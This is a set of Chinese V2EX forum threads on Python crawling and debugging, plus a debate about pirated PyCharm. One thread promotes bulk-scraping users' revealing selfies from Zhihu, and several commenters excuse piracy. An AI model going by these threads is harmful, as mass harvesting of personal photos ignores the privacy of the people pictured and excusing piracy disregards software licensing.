"pool.join()是等待所有线程结束不过运行到不能打开的网址时会一直等待那一个线程。", " \r", " 这个网址设置 timeout 无效。。", " 无效是什么意思，我运行了没发现问题啊", " \r", "requests.get('http://jy-qj.com.cn',  timeout=1.5) \r", "还是会等待老长时间然后报这个错\r", "requests.exceptions.ConnectionError: HTTPConnectionPool(host='jy-qj.com.cn', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<requests.packages.urllib3.connection.HTTPConnection object at 0x00000000032ED358>: Failed to establish a new connection: [Errno 11004] getaddrinfo failed',))\r", "\r", "python3.4.1 requests2.9.1", " ", " 这个不管你设置多少都是秒报错啊，他域名都没解析，更新下 requests 版本吧，我测试没出现你这情况", " 这个是正解，在 requests 设置 timeout", " 或者 requests 前先 ping 如果 Unknown host 直接 break =,=||", " 更新成 2.13.0 ，还是要等老长时间。在虚拟机 32 位 win7 32 位 python 测试等待的时间少些，没达到秒报错。\r", "先用 ping 检测下了。", " 我不是 win 系统😊", " 不过还有个问题，既然是多线程，那就让哪一个线程等待就是了，为什么会卡在一个线程上呢。。", " 不知道，好像没卡在一个线程上啊，只是程序好像要等待所有线程结束，你可以用 BoundedSemaphore 来控制阻塞", "我试怎么没问题？", "\r", " \r", "你们的 python 都是什么版本。我更新下 python 看看是不是 python 的问题。\r", "我这边只要不是无法解析的网址都是正常运行，一有无法解析的就卡主一会。。", "Python 2.7.11 |Anaconda 2.5.0 (x86_64)| (default, Dec  6 2015, 18:57:58) \r", "[GCC 4.2.1 (Apple Inc. build 5577)] on darwin", "requests timeout + 线程 timeout, 用 requests 有时确实会发生永久阻塞不解析的问题 原因比较难找 多半可能和系统环境有关系 保险的方式还是给每个线程都加 timeout", " 抛开自己写，有没有可以自带线程超时的包，\r", "from concurrent.futures import ThreadPoolExecutor\r", "一般用这个线程池，他的 map 方法有一个 timeout ，不过尝试后发现没效果。", " python 标准库 threading 的 join 自带 timeout 用起来很简单的，还有就是看看 gevent 这个是用协程实现的并发框架非常的好用， timeout 也有好几种实现，具体细节请自行搜索相关 sample 和文档。", " 谢谢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>demo</h1>\n<p><strong>地址在这里</strong> <a href=\"https://github.com/AnyISalIn/zhihu_fun\" rel=\"nofollow\">zhihu_fun Github</a>，求 star !!!!</p>\n<p>。。。嗯，其实也可以爬其他方面的东西，但是目前只支持抓图片，其实这不是我的本意，我是想抓技术方面的东西的，但是我同事想要看这个，所以我就先抓这些图片了。。。Python 菜鸟一枚，代码写的很烂，还望各位大神多多指教\n<img alt=\"\" src=\"http://o6uf0hcqq.bkt.clouddn.com/web_demo.png\"></p>\n<p><img alt=\"\" src=\"http://o6uf0hcqq.bkt.clouddn.com/keyword_demo.png\"></p>\n<p><img alt=\"\" src=\"http://o6uf0hcqq.bkt.clouddn.com/result_demo.png\"></p>\n<p><img alt=\"\" src=\"http://o6uf0hcqq.bkt.clouddn.com/data_demo.png\"></p>\n<h1>为什么要用 Selenium ？</h1>\n<p>新版知乎部分页面用 React 重写了，必须得加载 JS ，很多加载啥的都需要点击，所以我就用到了 Selenium</p>\n<h1>为什么不用知乎 API ？</h1>\n<p>单纯的想写一个爬虫而已</p>\n</div></div>", "<div class=\"topic_content\">还差一个就 100 star 了。。</div>"], "reply": "32", "tittle": "用 Python 3 写了个基于 selenium 的知乎关键词爬虫，可以爬钓鱼贴图片(各种爆照! 你懂得。。。)", "comment": ["一百次点击，无人回复，干的漂亮。", "厉害了", "营养跟不上啊...农村人还是在 B 乎上 Block 这些话题吧", "提醒：_b 去掉试试😏", " 哇，去掉了，发现更大的世界", "楼主 66666", "star 已送", "这必须赞一波", "已 star ，过了不到一个小时开始非常慢了，难道是把知乎扒光了？", "按照关键字搜帖子的时候，发现很多帖子里面的图片都是无关的。 好奇怎么过滤的", "让我想起了知乎上这个收藏 ", " (大胸妹子 - 收藏夹 - 知乎)", " 你配置文件中的 url_generate_time 设置为多少，默认为 30s ，意味着爬问题只爬 30s, 剩下的就是怕回答中的图片，我爬了 20 多 g 了，设置为 None 就可以一直爬下去。。", " 这个的话，我并没有做，但是可以经爬下来之后做图像识别啥的，嗯，比较高端", "很好，收藏了", " #12 设置都是默认值", " 嗯，你设置 url_generate_time 为 None 就能一直爬了，我已经爬了 22G 了。。。", "估计能扒到 nfsw 这类管理员来不及删的东西", " 可以搞个深度 CNN 分类器啦（雾）", " 感觉太高端了。。。", "知乎不做 ip 限次?", " 好像没有。。。", "已 S&F", "先 mark ，回去 star", "哎家里穷，不要发这样的照片", "实践出真知！", "专门抓大腿的", " 也可以抓其他东西啊，嘿嘿", " 再配合某云服务的图片鉴黄 api ，就完美了。。。", "很好，已经 star", "道友想法很不错啊 我也在微博爬呢-。-\r", "改改我去爬 tumblr :)", "支持楼主"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一篇： <a href=\"https://www.v2ex.com/t/351900\" rel=\"nofollow\">https://www.v2ex.com/t/351900</a></p>\n<p>第二篇： <a href=\"http://www.jianshu.com/p/b3bc88ffb251\" rel=\"nofollow\">http://www.jianshu.com/p/b3bc88ffb251</a>\n爬虫中的正则表达式（ re ）—前传</p>\n<p>这篇文章只是一个开头，希望通过这篇文章收集大家的建议</p>\n<ol>\n<li>大家认为好的资料（ github 上的，自己写的，你认为写的比较好的博客....都行）</li>\n</ol>\n<p>我可以把推荐的资料放在文末的参考资料中或者直接写在正文中，当然会推荐者署名</p>\n<ol>\n<li>\n<p>大家对这篇文章的建议，应该怎么写比较好，欢迎大家提建议</p>\n</li>\n<li>\n<p>欢迎投稿，；）</p>\n</li>\n</ol>\n</div></div>", "<div class=\"topic_content\">我会做好正则表达式文章的更新，才会去做多进程和代理池等的更新。一个人更新文章不太简单，而且想写点和别人不一样的东西。（之前没有想这么多，自己挖了一个坑，当然我会填的，~_~）</div>", "<div class=\"topic_content\">谢谢大家关注，最近爬虫的更新会放缓，我要开始学习运营和机器学习相关知识了，还要开始找工作。\r<br>具体说明见： <a target=\"_blank\" href=\"http://www.jianshu.com/p/07f0d5a44f64\" rel=\"nofollow\">http://www.jianshu.com/p/07f0d5a44f64</a>\r<br>\r<br>（学习爬虫，只为了得到数据，我可不想玩转爬虫，我喜欢分析数据。希望大家多多推荐机器学习和运营的资料，先谢啦）</div>", "<div class=\"topic_content\">更新了爬虫正则表达式一文\r<br><a target=\"_blank\" href=\"http://www.jianshu.com/p/b3bc88ffb251\" rel=\"nofollow\">http://www.jianshu.com/p/b3bc88ffb251</a></div>"], "reply": "20", "tittle": "第二篇爬虫文章来了，只不过是前传", "comment": ["期待代理池的文章！", " 正则写完就写代理池。当然还要看正则这篇文章的反馈情况，：）", "期待并发和代理池", "同期待代理池", "期待代理池+1", " 嗯，等我写完正则。。。或者可以投稿把正则这个坎绕过去", " 等我写完正则。。。或者可以投稿把正则这个坎绕过去", " 好的，我会根据反馈情况不断修正文章的更新进度", "期待代理池+1", "代理池等待中", " \r", " \r", "嗯，这个等我慢慢跳坑\r", "欢迎投稿", "看大家期望这么高你要不先把代理池写了（逃", " 这个很难做到，文章不能大跃进啊（摊手", "代理池构建的思路是：\r", "1. 正则匹配出代理 ip ，有些免费网页很规则，用 beautifulsoup 就行\r", "\r", "2. 检查是否为高匿代理，为了加快检查速度，采取多进程\r", "\r", "3. 加上高匿代理，进行爬虫\r", "\r", "所以，正则是基础，多进程也很重要（多线程也行）\r", "\r", "大家可以根据这些知识点，进行自学，如果学好了，欢迎投稿，:)\r", "\r", "我的文章不会更新这么快，因为我想写点不一样的东西，符合我的行文特点，：）\r", "\r", "（当然主要是因为，我要写毕业论文....还有....找工作...）", "补充一下，当然有要有刷新代理池中代理的代码，而且一般代理极易失效", "如何高效获取一手 ip 代理，而不是从别人网站上爬，题主有思路么", " 这个还真没思路。可能只有花钱买吧", "最好详细讲解一下 并发原理...\r", "pycon2015 上讲的就不错\r", "不然新人看了 还是一头雾水", " 谢谢建议。文章中不涉及基础原理，只讲实战部分。主要原因是原理部分我真的讲不好。\r", "\r", "如果有并发原理的好文章，欢迎投稿，：）", "期待数据入库 0.0"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问这个错误是哪里出了问题？</p>\n<p>这是我的 url</p>\n<pre><code>urlpatterns = [\n        #post views\n        url(r'^$', views.post_list, name='post_list'),\n        url(r'^(P?&lt;year&gt;\\d{4})/(P?&lt;month&gt;\\d{2})/(P?&lt;day&gt;\\d{2})/(?P&lt;post&gt;[-\\w]+)/$', views.post_detail, name='post_detail'),\n]\n</code></pre>\n<p>models</p>\n<pre><code>@python_2_unicode_compatible\nclass Post(models.Model):\n    STATUS_CHOICES = (\n            ('draft', '草稿'),\n            ('published', '发布')\n            )\n    title = models.CharField(max_length=250)\n    slug = models.SlugField(max_length=250, unique_for_date='publish')\n    author = models.ForeignKey(User, related_name='blog_posts')\n    body = models.TextField()\n    publish = models.DateTimeField(default=timezone.now)\n    created = models.DateTimeField(auto_now_add=True)\n    update = models.DateTimeField(auto_now=True)\n    status = models.CharField(max_length=10, choices=STATUS_CHOICES,default='draft', verbose_name='状态')\n    objects = models.Manager()\n    published = PublishedManager()\n\n    class Meta:\n        ordering = ('-publish',)\n\n    def __str__(self):\n        return self.title\n\n    def get_absolute_url(self):\n        return reverse('blog:post_detail', args=[self.publish.year,\n                                                 self.publish.strftime('%m'),\n                                                 self.publish.strftime('%d'),\n                                                 self.slug])\n</code></pre>\n<p>错误信息是</p>\n<pre><code>NoReverseMatch at /blog/\n\nReverse for 'post_detail' with arguments '(2017, '04', '04', 'test1')' and keyword arguments '{}' not found. 1 pattern(s) tried: ['blog/(P?&lt;year&gt;\\\\d{4})/(P?&lt;month&gt;\\\\d{2})/(P?&lt;day&gt;\\\\d{2})/(?P&lt;post&gt;[-\\\\w]+)/$']\n\nRequest Method: \tGET\nRequest URL: \thttp://127.0.0.1:8000/blog/\nDjango Version: \t1.10.6\nException Type: \tNoReverseMatch\nException Value: \t\n\nReverse for 'post_detail' with arguments '(2017, '04', '04', 'test1')' and keyword arguments '{}' not found. 1 pattern(s) tried: ['blog/(P?&lt;year&gt;\\\\d{4})/(P?&lt;month&gt;\\\\d{2})/(P?&lt;day&gt;\\\\d{2})/(?P&lt;post&gt;[-\\\\w]+)/$']\n\nException Location: \t/usr/local/lib/python3.6/site-packages/django/urls/resolvers.py in _reverse_with_prefix, line 392\nPython Executable: \t/usr/local/opt/python3/bin/python3.6\nPython Version: \t3.6.1\nPython Path: \t\n\n['/Users/Licht/Code/Python/Django_by_Example/mysite',\n '/usr/local/Cellar/python3/3.6.1/Frameworks/Python.framework/Versions/3.6/lib/python36.zip',\n '/usr/local/Cellar/python3/3.6.1/Frameworks/Python.framework/Versions/3.6/lib/python3.6',\n '/usr/local/Cellar/python3/3.6.1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/lib-dynload',\n '/usr/local/lib/python3.6/site-packages']\n\nServer time: \t星期二, 4 四月 2017 16:08:35 +0800\n</code></pre>\n<p>我是照着 django by example 的代码写的为什么会有问题呢？</p>\n</div></div>"], "reply": "2", "tittle": "关于 django url 不匹配的问题", "comment": ["正则表达式应该是`?P<name>`吧", " 对，我去吃了个饭回来就看到了，不知道为什么当时跟瞎了一样死活找不到"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>题目的表达可能有些问题。\n情况是这样的：\n现有已经存在大量数据的 MongoDB 集合，现在要添加一个新的字段，然后这样字段的值来自于一个 json 文件。不过这样文件特别大（ 4.5G ）在使用 Python 中 json 的 loads （）来操作会卡死，因为 12G 的内存更本弄不了。我还想过 split 来处理 json 文件，但是生成的文件太多，造成在遍历文件的时候卡主了。\n至于为什么不用 MongoDB 自带的处理 json ，是因为 json 有些字段不需要。</p>\n<p>不过我想想，目前要是能导入进去就可以了。</p>\n<p>问题就是怎么去更新呢？</p>\n<p>谢谢</p>\n</div></div>"], "reply": "8", "tittle": "Python 操作大文件更新 MongoDB 的操作", "comment": ["这个不太懂，不过如果没有其它好办法的话能不能用 MongoDB 自带的先导入到一个临时库里再去掉不需要的部分？", "使用游标读取数据，手动设置一次更新的数据条数，时间换空间，另外这种可以考虑一下协程或者多进程操作的吧？", "你这问题应该和 mongodb 无关吧，主要问题是如何用 python 操作大的 json 文件读写数据", "之前遇到过类似的问题，从一个超大的文本文件倒入到数据库，比你这个还大， 10G 每个文件，本来用的 mongodb ，测了一次以后我转到 postgresql 去了……", "MongoDB 有 aggregate pipeline / bulk 操作, up 可以查一查", "不生成文件对应的 JSON 对象，直接解析 .json 文件，使用正则表达式或者其他什么手段来提取数据。", "你是说用 split(1) 处理？如果可以用分行处理，那也可以直接用 python 的 for line in file_object 来逐行处理啊", "既然 Python 都参与了，没有对数据做 pagination 么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>例如：</p>\n<pre><code>map(lambda: i, x: (i + 1, x), enumerate(sys.argv))\n</code></pre>\n<p>上面这段代码在 Python3 中是错误的，必须改为</p>\n<pre><code>map(lambda: x: (x[0] + 1, x[1]), enumerate(sys.argv))\n</code></pre>\n<p>不可以将 tuple 或 list 对象可以自动拆包了，还是有别的方法呢？</p>\n</div></div>"], "reply": "14", "tittle": "Python3 在 lambda 表示中不支持将迭代返回的 tuple 对象拆包为对应的参数吗？", "comment": ["lambda 后面多了个 :", "等效语法：\r", "((i + 1, x) for i, x in enumerate(sys.argv))\r", "\r", "map 已经不推荐用了", " 嗯，手写的代码。\r", " map 不能用了，那么 filter 怎么办呢？", "直接用 list comprehension ？", "[(x[0] + 1, x[1]) for x in enumerate(sys.argv)]这样？", "from itertools import startmap\r", "starmap(lambda i, x: (i + 1, x), enumerate(sys.argv))", "typo: startmap -> starmap", " Thank you, itertools.startmap 的确进行了拆包。", " #5 就是 2L 那样， 2L 的结果是一个 Generator ，最外面的圆括号换成方括号结果就是列表。", "似乎可以这样：\r", "map(lambda: i, x: (i + 1, x), *zip(enumerate(sys.argv)))", "不好意思打错了\r", "map(lambda i, x: (i + 1, x), *zip(*enumerate(sys.argv)))", "Lambda i, x 这样是接受两个 argument ， tuple 是一个，可以用星号*展开成两个\r", "也可以这样定义 lambda (i, x)，这样就是接受一个 tuple", "就算是普通函数也不能自动拆包啊，而要用*显式展开。因为函数根本不知道需不需要拆包，假如你就是想传入一个类型是 tuple 的参数呢。", "\r", "楼主说的是这个？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我有个需求，匹配 HTML 里的注释。以下两段代码：</p>\n<pre><code>#!/usr/bin/env python3\n\nimport re\n\nhtml = \"\"\"\n&lt;html&gt;\n        &lt;something&gt;\n        &lt;/something&gt;\n        &lt;!--\n                aaa\n                bbb\n                ccc\n        --&gt;\n        111&lt;!--\n                ccc\n                bbb\n                aaa\n        --&gt;11\n&lt;/html&gt;\n\"\"\"\n\nitem = re.findall(r\"(?&lt;=&lt;!--).+?(?=--&gt;)\",html,re.S)\nfor i in item:\n        print(i)\n</code></pre>\n<p>上面这个可以匹配成功。</p>\n<p>这个就匹配不出来：</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\nimport re\nimport json\nimport sys\n\ns = requests.session()\n\nparams = {\n        \"ie\" : \"utf-8\",\n        \"kw\" : \"linux\"\n}\npage = s.get(\"http://tieba.baidu.com/f\",params = params)\ntext = page.text\n\ntiezi_data = re.findall(r\"(?&lt;=&lt;!--).+?(?=--&gt;)\",text,re.S)\nprint(tiezi_data)\nprint(len(tiezi_data))\n</code></pre>\n<p>贴吧的页面里有大量注释，注释里有大量的信息，可以在浏览器里看到。但是我的正则只能匹配到第一个，我不知道为什么。</p>\n</div></div>"], "reply": "5", "tittle": "Python 的正则是不是有匹配的字符串的最大长度的限制啊", "comment": ["在 text 字符串中搜索下 <!-- ， 只有 <!--STATUS OK-->, 好像服务器直接返回给你的内容中并没有什么注释，\r", "页面中之所以能看到，应该是前端异步获取的内容，你再仔细确认下吧", " 我刚刚才看到，现在已经关电脑了，明天再看看。", "贴吧那部分内容是 script 渲染上去的，直接 html 是没有内容的，而且即使有长度限制，也是直接报错的", "```Python\r", "html = \"\"\"\r", "<html>\r", "        <something>\r", "        </something>\r", "        <!--\r", "                aaa\r", "                bbb\r", "                ccc\r", "        -->\r", "        111<!--\r", "                ccc\r", "                bbb\r", "                aaa\r", "        -->11\r", "</html>\r", "\"\"\"\r", "import re\r", "re.findall(r\"(?is)(?:\\<\\!\\-\\-)(.+?)(?:\\-\\-\\>)\",html)\r", "['\\n                aaa\\n                bbb\\n                ccc\\n        ', '\\n                ccc\\n                bbb\\n                aaa\\n        ']\r", "\r", "```", "除了异步加载的问题，另外匹配注释可以用 bs4 。 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一篇： <a href=\"http://www.jianshu.com/p/11d7da95c3ca\" rel=\"nofollow\">http://www.jianshu.com/p/11d7da95c3ca</a></p>\n<p>这一系列文章不写复杂的爬虫，而是将复杂的爬虫涉及到的核心知识点写清楚</p>\n<ol>\n<li>\n<p>代理池（高匿）</p>\n</li>\n<li>\n<p>多进程</p>\n</li>\n<li>\n<p>正则表达式</p>\n</li>\n<li>\n<p>数据库</p>\n</li>\n<li>\n<p>selenuim</p>\n</li>\n<li>\n<p>手机抓包</p>\n</li>\n<li>\n<p>....</p>\n</li>\n</ol>\n<p>希望 V 友能提提建议，能投稿就更好了</p>\n</div></div>", "<div class=\"topic_content\">第二篇出炉： <a target=\"_blank\" href=\"https://www.v2ex.com/t/352150\" rel=\"nofollow\">https://www.v2ex.com/t/352150</a></div>", "<div class=\"topic_content\">这篇文章想不到点击了 4000 多次， 192 次收藏，谢谢大家关注。最近爬虫的更新会放缓，我要开始学习运营和机器学习相关知识了，还要开始找工作。\r<br>具体说明见： <a target=\"_blank\" href=\"http://www.jianshu.com/p/07f0d5a44f64\" rel=\"nofollow\">http://www.jianshu.com/p/07f0d5a44f64</a>\r<br>\r<br>（学习爬虫，只为了得到数据，我可不想玩转爬虫，我喜欢分析数据）</div>", "<div class=\"topic_content\">希望大家多多推荐机器学习和运营的资料，先谢啦，：）</div>", "<div class=\"topic_content\">更新了爬虫正则表达式一文\r<br><a target=\"_blank\" href=\"http://www.jianshu.com/p/b3bc88ffb251\" rel=\"nofollow\">http://www.jianshu.com/p/b3bc88ffb251</a></div>"], "reply": "80", "tittle": "开始在简书上写 Python 爬虫系列文章", "comment": ["要不看看[Python 全栈之路系列文章]( ", ")", "一定要多图哟！", " 谢谢！已经收藏到书签栏，这是基于 Python2 ？爬虫中我使用的数据库一般是 MongoDB", " 放心吧，一般都是动态图，实用且有趣味", "为啥选简书……", " 不然选啥呢？我用 markdown 来写文章， github 有时候打开太慢，虽然我有 SS ，不是所有读者都用代理吧", "果断收藏！", "给你一些资源文档 ", " 技术文档首选写作平台 不是盖的~", " 欢迎一起写呀，入坑 Python 爬虫系列", " 谢谢推荐，在简书用的还行，暂时不算换了。欢迎投稿哈,:)", "建议可以参考下崔庆才系列和路人甲系列，看看如何有些更深入浅出的表达和好玩的例子哈", "基础做完可以做些有针对性的爬虫  \r", "根据不同的场景和框架，发现这方面做得人很少。  \r", "已加书签，持续关注中", " 谢谢建议哈，我去看看。我尽量做好，希望一起来玩哈，一个人更新的话会很慢，我最近也要忙着写毕业论文", "支持", " 如果一起来写就好了，入坑 Python 爬虫系列，众人拾柴火焰高", " 谢谢支持，希望多提提意见，:)", "已收藏，希望能写简单一点，让我们这些小白能够看懂。", " 好的，我尽量哈，我以后的文章会放一些参考资料，：）", "666 ，正在学 python ，来的很及时，加油 LZ", " 太喜欢你的博客了！！赞！看着真舒服！", " 好的，一起来玩哈", "想看代理池的部分，什么时候更新呢？", " 拥抱 Python3\r", "\r", "  thx", " 这个更新的具体时间未定，代理池相关文章应该会放在正则之后", " 我一直学的就是 Python3 ，虽然看了一些视频教程（ Python2 ），但是里面的代码我全部用 Python3 实现，：）", " 对了，有兴趣写写 Python 爬虫的文章么？:)", " 叼", " 正在学- -。", "你都会了 py 技术？", " 正需要这些新鲜的知识，欢迎投稿，:)", " 我爬取过高考吧 200 多万条记录，用里上面写大部分技术，爬网易云课堂评论的时候用过 selenium\r", "\r", "虽然代码写的不漂亮，但是能干活。", "能顺手同步到 github 上吗，感觉 github 看 md 文件挺好的", " 3Q", "爬虫已经成功了程序员必备技能了", "  谢谢提建议，暂时不打算到 github 维护文章，因为要写毕业论文，：（", " 也不一定，我寝室一个哥们转行 java ，让他写爬虫，死活不写，还是看个人兴趣。。:)", "一定要来几个高级爬虫的例子！", " 水到渠成的时候，可能会写的。如果把这些知识点写完，只要结合几个知识点，那么就可以写出高级爬虫的例子了，：）", "思考题一有个错别字，网页写成了网易", " 已经更正，文章第一行有更新信息，加了你的 V2EX 主页链接，如果可能对你造成影响，请告诉我，我立即清除", "  ", "  哈哈哈，没想到还有这个待遇，不过链接还是去了吧。毕竟我不是做技术的，保留我的用户名让我得瑟下", " 好的，已经 ok 了。多交流哈，欢迎投稿，哈哈", " 如果你是多人团队写作的话 看云肯定比简书方便 都是 MD 啊 另外 看云支持付费阅读哦 ^_^", " 好的，我会关注这个平台的，:)", "刚看到一个 V 友也在写爬虫文章，选择的平台也是简书。（在 Python 这个节点靠前的位置）\r", "\r", "他是从零入门的，而我这个不是从零入门的，基础知不会讲到。想想还，真是有缘，哈哈", "爬动态网站的方法不只有使用 webkit 这种傻瓜式的方法，还可以用抓包的方法", "可以啊！！！支持楼主！！！已关注！！！👍👍👍", " 有文章讲讲这方面的知识吗？\r", "同时欢迎 V 友投稿", " 谢谢，真的欢迎投稿，感觉自己挖了个大坑", " 感谢分享，请教一下\r", "如何确保程序连续运行？另外写一个监控进程?\r", "另外是多线程釆集还是就一个进程？", " 不用客气的，欢迎交流\r", "\r", "保证程序连续运行，是什么情况？能描述一个具体的实例么？\r", "\r", "我使用的是多进程", "文末的头像很赞，基于 wordcloud 吗", " 果然也是老司机。确实是用 wordcloud 做的", "Mark 一下。", " 比如你应该是放后跑爬虫程的吧？有没有遇到因为各种原因跑着跑着退出了? 然后有另外一个进程监控一下？", " 好问题！\r", "爬取网页多的情况下，并不知道会出现什么样的异常，除非对网站十分熟悉。那么换一种思路，按绝大多数的正常网页来编写爬虫程序，其余的用 try except 处理。\r", "\r", "最后对极少数的异常网页，做特殊处理。\r", "\r", "这是我的思路，欢迎交流\r", "\r", "（如果楼主愿意写些爬虫文章，欢迎投稿哈）", "太好了，正在学习爬虫。", "在学 py2.7 _(:3 」∠)_", " 哈哈，赶紧写了第二篇， ", " 差不多的，有 Python 基础就可以看，刚刚发布了第二篇， ", "大神，我有一个公司名列表，需要搜索对应的编号。然后根据编号再找另一编号，这种怎么写爬虫啊？", "支持，正在学习", " 呃，不好意思，我没有理解你的问题，~_~", " 嗯，欢迎投稿哈", " 哦，有一个公司列表[a,b ...] 要去网站 A 找到对应的编号 a 对应 111 ， b 对应 222 ，等等，然后再根据编号 111 去网站 B 找到对应的 a 的数据，然后再找 b 的数据。", " 这个过程挺清晰， 你在写代码的过程中，遇到的具体问题是什么？", " 你有没有写学习经历故事？", " 学习经历故事？这个还真没有。。。我是学石油专业的，想转行而学习 Python ，学习 Python 时间还较短。等我入门时间长了，可能会分享自己学习经历吧，:)", " 厉害 对了 你利用空闲时间做什么？", " 学习运营知识，我想成为一名运营者，，，我真的不厉害，只不过喜欢挖坑。你也是学 Python ？", " 第一步 a 到 111 ：中间需要在网站 A 搜索一下，这步就不太会写。", " 你到网站 A 搜索一下，观察搜索的网址构造的具体形式，然后构造网址（以公司为变量）进行请求", " ，你一说我明白了。谢谢啦！", "好奇你 1 和 2 打算怎么写", " 这个看文章的反馈和大家的建议吧。只讲最实用的部分，同样不讲基础。比如进程和线程的区别，这个不会在文章中出现。\r", "\r", "近期不会更新这两大部分，我要去找工作了，还有很多运营和机器学习的知识要学。。。", "文章的反馈比较少，我不会投入太多的时间去更新，坑会填完，但是不会太快。\r", "\r", "好多新知识要学，近期还会再挖几个坑", "正在学习><", " 厉害 对了 你利用空闲时间做什么？\r", " 嗯是的", "Python 技术分享的乱象 ", "\r", ">>>>>>\r", "现在知乎上 Python 相关内容有以下三大特点：\r", "\r", "1. 绝大多数是写爬虫的。", " 哈哈，不评论这篇文章"]},
{"content": ["<div class=\"topic_content\">用 scrapy-splash 读取的源码， iframe 下的内容没有返回， scrapy-splash 有啥好的解决方法么？除了 selenium 和 phantomjs 。</div>"], "reply": "目前尚无回", "tittle": "如何用 scrapy-splash 读取 iframe 下的内容？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>首先是代码：</p>\n<pre><code>DB.test.update(query={'host': ip, 'port': port}, update={$set: {'http': 'test'}})\n</code></pre>\n<p>这个代码会报这样的错误：</p>\n<pre><code>TypeError: 'update() takes at least 3 arguments (1 given)'\n</code></pre>\n<p>在这个之前我使用了最最简单的：</p>\n<pre><code>DB.test.update({'host': ip, 'port': port}, {\"$set\": {'http': 'test'}})\n\n</code></pre>\n<p>报的错误：</p>\n<pre><code>TypeError: \"unhashable type: 'dict'\"\n\n</code></pre>\n<p>我一脸的蒙蔽阿。什么情况。\n这个是问题是在这个<a href=\"https://www.v2ex.com/t/352448\" rel=\"nofollow\">主题</a>的一个简单解决方案。这情况怎么解决？</p>\n</div></div>", "<div class=\"topic_content\">解决了。谢谢提醒。</div>"], "reply": "2", "tittle": "Pymongo 中 update 的错误", "comment": ["第一行代码你的$set 没有加引号， Python 懵逼\r", "另外 update 已经被 deprecated ，推荐使用 update_one() 或者 update_many()"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>市面上的 Python 课程的环境搭建大都推荐 PyCharm ，而且都是推荐使用专业版，至于试用结束之后。。。</p>\n<p>“免费使用 30 天，到期后可以在百度搜索注册码”</p>\n</div></div>"], "reply": "89", "tittle": "某些课程的作者一边骂盗版课程，一边在课程中推荐使用盗版软件，这是什么心态", "comment": ["请问你说的「骂盗版课程」和「推荐使用盗版软件」的是同一个人么？", "关系到自己的利益问题啊", "屁股问题啊，很多说着正版软件的还不用着盗版影视、音乐与书籍。", "楼主用的都是正版不", "为什么非要推荐专业版，对我来说社区版功能已经够用了", " 软件、音乐、书籍都好办，花小钱能解决。\r", "\r", "就是影视麻烦，有些美区 iTunes 买不到， Netflix 也不包含。", "自从工作后，我用的都是正版，包括音乐，电影，书籍，软件和增值服务。", "我觉得没钱用盗版没有什么可耻，有钱还不支持正版才是**", " 你这思想有问题", "那个作者就是来打广告的， 你以为真的是来说人家盗他课程呀", " 我不知道我的思想有没有问题，但是如果是我的软件，别人真的是因为买不起正版用盗版，我一定把他们当正版用户对待，如果是有经济允许，还不买盗版的，那一定打击到底。", " #9 应该不是 v2 的那位， v2 那位教的是 Laravel （ PHP ）", "你们说的盗版不盗版是原则问题，人这纯碎是一个经济问题，自己盗版别人，支出省了，别人盗版自己，收入少了。", "理想与现实之间的矛盾！", "单拿盗版软件来说，我认为以学习为目的使用盗版挺正常的", " 你第二句讲的完全没有问题，但是第一句完全是在转移话题，从讨论打击盗版又到了质疑楼主，难道是为了这类人辩护吗？这心态我觉得有点问题", "PyCharm 不是有社区版吗", "经济允许？全家桶第一年也就 250 刀，第三年起就 150 刀，多少工作了的人穷到掏不起这点钱？\r", "大城市合租最便宜的单间，一个月的租金差不多也要 250 刀了，一个月一次的房租付的起，一年一次的软件买不起，呵呵。", " 没钱可以选择使用免费软件，没钱不能是一个人使用盗版的理由。", "社区版完全够用", "doublethink", "一直不好接受的正版就是为什么买个视频只能自己看。\r", "\r", "买本书看完可以给朋友看，可以和朋友一起看。买个教程和人一起看就算传播盗版了，更就别说发给人家了。\r", "\r", "比较接受的就是同一时刻只授权给一个设备。人家怎么转就是别人的事了。", "java 以外的 ide 不算必备... 不想买正版那么用文本编辑器就是了", "很明显就是三观的问题，如果国内跟国外一样的严格，就不会有那种你开心的跟他说有学生版，有优惠版，他跟你说网上有破解版的朋友了。", "同意 15 楼的，学的土木专业，常用的四五个工程类软件它们每个年订阅都要上千，用正版的话真的吃不消。", " 学校都会买一套正版吧", "竟然出现了用盗版还有理由的人， v 站风气就这样了？以前可是对盗版零容忍的。同意 #19 ，没钱用正版就用免费软件，你以为整个 GNU 计划的努力就这么不堪？", "我做的 django 视频教程就免费公开，里面所有的软件都是免费的。\r", " #9 所以你这含沙射影地在说我么？\r", "第一，我不会交 Python\r", "第二，记忆中我也没有像题主说的行为\r", "第三，我要推广会指明在推广\r", "第四，那是真的有人在盗版，现在来看，最好别被我抓到", " 如果我没有钱我可以去偷么？没有女友可以去耍流氓么？", "很简单啊，因为他是作课程的，不是作软件的。", "虽然盗版可耻，但很有用啊😉", "我想起了中国共产党", " 你还有 py 课程的?", "没钱用盗版也是很可耻的行为，我承认我现在就是这样。我的笔记本里有一篇就记着我用了哪些盗版软件，等工作稳定，肯定会慢慢补上。", " 如果是我老婆 出去跟人玩玩 我觉得没什么 所以我就应该推广到所有人老婆都可以出去跟人玩玩?   己所不欲 勿施于人 这个容易做到 但是 己之所欲 慎施于人 这个就难了", " 并没有", " 学校买过正版，后来发现因为授权机制没办法让个人用上，只能把盗版给我们用了。", "学生可以免费获取 JetBrains 全家桶正版 ☺️", " 邮箱就行", "用社区版做赚钱视频也是违法的", "很多的,会让你用正版 windows 但下盗版的无损音乐和蓝光电影,都是盗版, 每个人只关注会和他利益相关的那一块", "目前能省一点就省一点， mac 里有一半的软件是买的，有一般还是用的盗版。买买软件一年也花上千块了，还要换房贷有点吃不消。", " mac 大多数都有替代品 都是正版的路过 或者可以用 setapp 丢一个 aff ", " 已用谢谢，主要每年用于购买软件，书籍，课程的预算有限，纯属个人经济问题，不然也想全买正版。发一个我的\r", " 购买软件 我认为 